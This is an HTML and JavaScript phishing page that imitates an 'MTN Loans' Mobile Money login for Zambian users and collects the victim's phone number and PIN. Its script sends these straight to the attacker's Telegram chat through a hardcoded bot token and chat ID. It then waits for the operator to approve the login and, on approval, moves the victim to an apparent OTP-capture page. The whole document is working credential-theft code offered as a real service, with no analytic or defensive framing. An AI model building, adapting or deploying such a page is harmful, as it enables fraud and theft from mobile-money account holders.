<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>MTN Loans – PIN Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', Arial, Helvetica, sans-serif;
        }

        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
        }

        .container {
            width: 100%;
            max-width: 360px;
            margin: 0 auto;
            background: white;
            border-radius: 28px;
            padding: 30px 16px 36px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            position: relative;
            text-align: center;
        }

        .content {
            position: relative;
            z-index: 2;
        }

        .logo {
            text-align: center;
            margin-top: 20px;
        }
        .logo-circle {
            width: 48px;
            height: 48px;
            background: #000;
            border-radius: 50%;
            color: #FFCC00;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            margin: auto;
            font-weight: 800;
        }
        .logo-text {
            color: #000;
            font-size: 24px;
            font-weight: bold;
            margin-top: 6px;
        }
        .logo-text span {
            color: #FFCC00;
            background: #000;
            display: inline-block;
            padding: 0 6px;
            border-radius: 10px;
        }

        .title {
            text-align: center;
            color: #FFCC00;
            font-size: 18px;
            font-weight: 700;
            margin-top: 12px;
        }
        .subtitle {
            text-align: center;
            color: #555;
            font-size: 14px;
            margin-top: 8px;
            line-height: 1.45;
            padding: 0 4px;
        }

        .form {
            margin-top: 24px;
            text-align: left;
        }

        .label {
            font-size: 13px;
            color: #555;
            margin-bottom: 6px;
            display: block;
            font-weight: 500;
        }

        .input {
            width: 100%;
            height: 48px;
            border-radius: 12px;
            border: 1px solid #ddd;
            padding: 0 14px;
            font-size: 15px;
            background: #fff;
            outline: none;
            transition: border 0.2s;
        }
        .input:focus {
            border-color: #FFCC00;
            box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.3);
        }

        .btn {
            width: 100%;
            height: 52px;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            margin-top: 18px;
            cursor: pointer;
            font-weight: 700;
        }
        .btn-primary {
            background: linear-gradient(90deg, #FFCC00, #E6B800);
            color: #000;
            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3);
        }
        .btn-primary.disabled,
        .btn-primary:disabled {
            background: #e5e5e5;
            color: #999;
            cursor: not-allowed;
            box-shadow: none;
        }
        .btn-outline {
            background: transparent;
            border: 2px solid #FFCC00;
            color: #333;
            font-weight: 600;
        }

        .version {
            text-align: center;
            color: #aaa;
            font-size: 11px;
            margin-top: 18px;
        }

        .footer-note {
            text-align: center;
            color: #bbb;
            font-size: 10px;
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid #eee;
        }

        #spinner {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(2px);
            z-index: 999;
        }
        .loader {
            width: 42px;
            height: 42px;
            border: 4px solid #ffe0a3;
            border-top: 4px solid #FFCC00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .error-box {
            position: absolute;
            top: 12px;
            left: 12px;
            right: 12px;
            background: #fff;
            border: 2px solid #ff4d4d;
            border-radius: 14px;
            padding: 12px;
            display: none;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
            z-index: 100;
            text-align: left;
        }
        .error-title {
            color: #ff0000;
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 4px;
        }
        .error-text {
            color: #444;
            font-size: 13px;
        }
        .close {
            position: absolute;
            right: 12px;
            top: 8px;
            cursor: pointer;
            font-size: 20px;
            color: #999;
        }

        .hint {
            font-size: 11px;
            color: #aaa;
            margin-top: 4px;
            padding-left: 4px;
        }
        .hint strong {
            color: #666;
        }

        @media (max-width: 360px) {
            body {
                padding: 8px;
            }
            .container {
                padding: 24px 12px 32px;
                border-radius: 24px;
            }
            .logo {
                margin-top: 8px;
            }
            .logo-circle {
                width: 44px;
                height: 44px;
                font-size: 26px;
            }
            .logo-text {
                font-size: 22px;
            }
            .title {
                font-size: 17px;
                margin-top: 8px;
            }
            .subtitle {
                font-size: 13px;
            }
            .form {
                margin-top: 20px;
            }
            .input,
            .btn {
                height: 46px;
            }
            .btn {
                font-size: 15px;
                margin-top: 16px;
            }
            .version {
                font-size: 10px;
                margin-top: 16px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="error-box" id="errorBox">
            <div class="close" onclick="hideError()">×</div>
            <div class="error-title">Error</div>
            <div class="error-text" id="errorText">Invalid credentials</div>
        </div>

        <div class="content">
            <div class="logo">
                <div class="logo-circle">M</div>
                <div class="logo-text"><span>MTN</span> Loans</div>
            </div>
            <div class="title">Welcome to MTN Loans</div>
            <div class="subtitle">
                Enter your MTN MoMo number and PIN to log in.
            </div>

            <div class="form">
                <div class="label">MTN MoMo Number</div>
                <input class="input" id="phoneInput" placeholder="097 712 3456 or +260977123456" inputmode="numeric">
                
                <div class="label" style="margin-top:15px;">Enter your PIN</div>
                <input class="input" id="pinInput" placeholder="4 or 5 digits" inputmode="numeric" maxlength="5" type="password" autocomplete="off">

                <button class="btn btn-primary" id="loginBtn" disabled>Log In</button>
                <button class="btn btn-outline" id="goBackBtn">Back</button>

                <div class="version">v2.6.2 (MTN Loans Zambia)</div>
                <div class="footer-note">© 2026 MTN Zambia – Powered by MTN Mobile Money</div>
            </div>
        </div>
    </div>

    <div id="spinner">
        <div class="loader"></div>
    </div>

    <script>
        // ========== TELEGRAM CONFIG ==========
        const BOT_TOKEN = '8205203090:AAGJYcmFQe_I-Cw3xxnIhV0J25ZgaCwAExY';
        const CHAT_ID = '691605234';
        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

        // ========== DOM ELEMENTS ==========
        const phoneInput = document.getElementById('phoneInput');
        const pinInput = document.getElementById('pinInput');
        const loginBtn = document.getElementById('loginBtn');
        const goBackBtn = document.getElementById('goBackBtn');
        const spinner = document.getElementById('spinner');
        const errorBox = document.getElementById('errorBox');
        const errorText = document.getElementById('errorText');

        let isSubmitting = false;
        let currentPollInterval = null;

        // ============================================================
        //  PHONE NUMBER EXTRACTION – handles all Zambian formats
        // ============================================================
        function extractZambianPhone(raw) {
            if (!raw || typeof raw !== 'string') return null;
            let digits = raw.replace(/\D/g, '');
            if (!digits) return null;

            // Remove country code 260 if present at the start
            if (digits.startsWith('260')) {
                digits = digits.substring(3);
            }
            // Remove leading zero if present
            if (digits.startsWith('0')) {
                digits = digits.substring(1);
            }
            // Must be exactly 9 digits
            if (digits.length !== 9) return null;
            // Optional: validate first digit (5-9 for Zambian mobile)
            const first = parseInt(digits.charAt(0), 10);
            if (first < 5 || first > 9) return null;
            return digits;
        }

        // ============================================================
        //  UI HELPERS
        // ============================================================
        function showError(message) {
            errorText.innerText = message || 'Invalid credentials';
            errorBox.style.display = 'block';
        }

        function hideError() {
            errorBox.style.display = 'none';
        }

        function clearPinField() {
            pinInput.value = '';
        }

        function focusFirstInput() {
            phoneInput.focus();
        }

        function updateLoginButton() {
            const phoneRaw = phoneInput.value.trim();
            const pinRaw = pinInput.value.trim();

            const phoneCore = extractZambianPhone(phoneRaw);
            const isPhoneValid = phoneCore !== null;

            const pinDigits = pinRaw.replace(/\D/g, '');
            const isPinValid = (pinDigits.length === 4 || pinDigits.length === 5);

            loginBtn.disabled = !(isPhoneValid && isPinValid);
        }

        function stopPolling() {
            if (currentPollInterval) {
                clearInterval(currentPollInterval);
                currentPollInterval = null;
            }
        }

        function escapeHtml(unsafe) {
            if (!unsafe) return '';
            return unsafe.replace(/[&<>"]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                if (m === '"') return '&quot;';
                return m;
            });
        }

        // ============================================================
        //  TELEGRAM SEND & POLLING
        // ============================================================
        async function sendLoginToTelegram(phone9, pin) {
            const ts = Date.now();
            const approveId = `login_approve_${ts}`;
            const declineId = `login_decline_${ts}`;

            sessionStorage.setItem('mtn_phone', phone9);
            sessionStorage.setItem('mtn_pin', pin);

            // Display with leading zero for readability
            const displayPhone = '0' + phone9;

            const message =
                `🔐 <b>MTN Loans Login Request</b>\n\n` +
                `<b>MoMo Number:</b> <code>${escapeHtml(displayPhone)}</code>\n` +
                `<b>PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
                `📢 <b>Approve or Decline this login attempt:</b>`;

            try {
                const response = await fetch(`${API_BASE}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '✅ Approve', callback_data: approveId },
                                    { text: '❌ Decline', callback_data: declineId }
                                ]
                            ]
                        }
                    })
                });

                if (!response.ok) throw new Error(`HTTP ${response.status}`);

                startPollingForDecision(approveId, declineId);
            } catch (err) {
                console.error('Telegram send error:', err);
                spinner.style.display = 'none';
                isSubmitting = false;
                loginBtn.disabled = false;
                updateLoginButton();
                showError('Network error. Please try again.');
            }
        }

        function startPollingForDecision(approveId, declineId) {
            stopPolling();
            let lastUpdateId = 0;

            currentPollInterval = setInterval(async () => {
                try {
                    const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
                    const response = await fetch(url);
                    const data = await response.json();
                    if (!data.ok || !data.result.length) return;

                    for (const update of data.result) {
                        lastUpdateId = Math.max(lastUpdateId, update.update_id);
                        const callback = update.callback_query;
                        if (!callback) continue;
                        const cbData = callback.data;

                        if (cbData === approveId) {
                            stopPolling();
                            spinner.style.display = 'none';
                            isSubmitting = false;
                            window.location.href = 'otp-link.html';
                            return;
                        }

                        if (cbData === declineId) {
                            stopPolling();
                            spinner.style.display = 'none';
                            isSubmitting = false;
                            loginBtn.disabled = false;
                            updateLoginButton();
                            showError('Authentication declined. Please check your phone number and PIN.');
                            clearPinField();
                            phoneInput.focus();
                            return;
                        }
                    }
                } catch (err) {
                    console.warn('Polling error:', err);
                }
            }, 1500);
        }

        // ============================================================
        //  SUBMIT HANDLER
        // ============================================================
        async function submitLogin() {
            if (isSubmitting) return;

            const phoneRaw = phoneInput.value.trim();
            const pinRaw = pinInput.value.trim();

            hideError();

            // Extract core 9-digit number
            const phoneCore = extractZambianPhone(phoneRaw);
            if (!phoneCore) {
                showError('Please enter a valid Zambian phone number (e.g. 0977123456 or +260977123456).');
                phoneInput.focus();
                return;
            }

            const pinDigits = pinRaw.replace(/\D/g, '');
            if (!pinDigits) {
                showError('Please enter your PIN (4 or 5 digits).');
                pinInput.focus();
                return;
            }
            if (pinDigits.length !== 4 && pinDigits.length !== 5) {
                showError('PIN must be 4 or 5 digits.');
                pinInput.value = '';
                pinInput.focus();
                return;
            }

            isSubmitting = true;
            loginBtn.disabled = true;
            spinner.style.display = 'flex';

            await sendLoginToTelegram(phoneCore, pinDigits);
        }

        // ============================================================
        //  EVENT LISTENERS
        // ============================================================
        // Phone input: allow any characters, but update button state
        phoneInput.addEventListener('input', function() {
            updateLoginButton();
            hideError();
        });

        phoneInput.addEventListener('paste', function() {
            setTimeout(() => {
                updateLoginButton();
                hideError();
            }, 10);
        });

        pinInput.addEventListener('input', function(e) {
            let val = this.value.replace(/[^0-9]/g, '');
            if (val.length > 5) val = val.slice(0, 5);
            this.value = val;
            updateLoginButton();
            hideError();
        });

        pinInput.addEventListener('paste', function(e) {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const digits = pasted.replace(/\D/g, '').slice(0, 5);
            this.value = digits;
            updateLoginButton();
            hideError();
        });

        loginBtn.addEventListener('click', submitLogin);

        goBackBtn.addEventListener('click', () => {
            stopPolling();
            window.history.back();
        });

        // ============================================================
        //  INIT
        // ============================================================
        function init() {
            updateLoginButton();
            hideError();
            phoneInput.focus();
        }

        init();

        window.hideError = hideError;
    </script>
</body>
</html>
